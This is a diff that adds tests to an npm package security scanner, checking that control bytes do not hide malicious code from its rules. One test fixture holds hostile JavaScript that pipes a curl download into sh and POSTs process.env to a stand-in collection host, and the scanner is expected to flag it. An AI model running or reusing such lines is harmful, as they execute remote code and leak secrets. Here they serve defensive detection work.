@@ -6,6 +6,7 @@ import {
   deterministicFindings,
   tarSuspiciousEntryFindings,
 } from "../server/lib/review";
+import { summarizeFile } from "../server/lib/tar-parser.js";
 import {
   distinctTokenText,
   loadCallArgumentText,
@@ -350,6 +351,70 @@ describe("review", () => {
       createPackageDiff([], [{ ...staged[0], flags: ["binary", "native-elf"] }]),
     );
     expect(flagged.filter((finding) => finding.ruleId === "file.native-artifact")).toHaveLength(1);
+  });
+
+  test("a control byte in an entrypoint no longer hides its code from the content rules", async () => {
+    const source =
+      "const cp = require('child_process');\n" +
+      "cp.exec('curl https://payload.example.invalid/a.sh | sh');\n" +
+      "fetch('https://collect.example.invalid', { method: 'POST', body: JSON.stringify(process.env) });\n";
+    const manifest = JSON.stringify({ name: "pkg", version: "1.0.0", main: "index.js" });
+    const findingsFor = async (body) => {
+      const staged = [
+        await summarizeFile("package.json", new TextEncoder().encode(manifest)),
+        await summarizeFile("index.js", new TextEncoder().encode(body)),
+      ];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => `${finding.ruleId}:${finding.severity}`,
+      );
+    };
+
+    const plain = await findingsFor(source);
+    const padded = await findingsFor(`/*\0*/${source}`);
+    expect(plain).toContain("code.remote-shell:critical");
+    expect(padded).toEqual(expect.arrayContaining([...plain, "file.control-bytes:high"]));
+  });
+
+  test("file.control-bytes grades by release status and flags binary entrypoints, not imported assets", () => {
+    const manifest = {
+      path: "package.json",
+      size: 60,
+      sha256: "manifest",
+      flags: [],
+      textSample: JSON.stringify({
+        name: "pkg",
+        version: "1.0.1",
+        main: "lib/main.dat",
+        bin: { pkg: "lib/util.js" },
+        exports: { ".": "./lib/main.dat", "./empty": "./index.js" },
+      }),
+    };
+    const hidden = {
+      path: "lib/util.js",
+      size: 40,
+      sha256: "util",
+      flags: ["control-bytes"],
+      textSample: "/*\uFFFD*/ module.exports = require('../assets/font.dat');\n",
+    };
+    const entry = { path: "lib/main.dat", size: 40, sha256: "main", flags: ["binary"] };
+    const data = { path: "assets/font.dat", size: 40, sha256: "font", flags: ["binary"] };
+    const empty = { path: "index.js", size: 0, sha256: "empty", flags: ["binary"] };
+    const staged = [manifest, hidden, entry, data, empty];
+    const controlBytes = (previous) =>
+      deterministicFindings(staged, createPackageDiff(previous, staged), undefined, {
+        previousFiles: previous,
+      })
+        .filter((finding) => finding.ruleId === "file.control-bytes")
+        .map((finding) => [finding.file, finding.severity]);
+
+    expect(controlBytes([])).toEqual([
+      ["lib/util.js", "high"],
+      ["lib/main.dat", "high"],
+    ]);
+    expect(controlBytes(staged)).toEqual([
+      ["lib/util.js", "medium"],
+      ["lib/main.dat", "medium"],
+    ]);
   });
 
   test("does not apply Python capability patterns to JavaScript packages", () => {
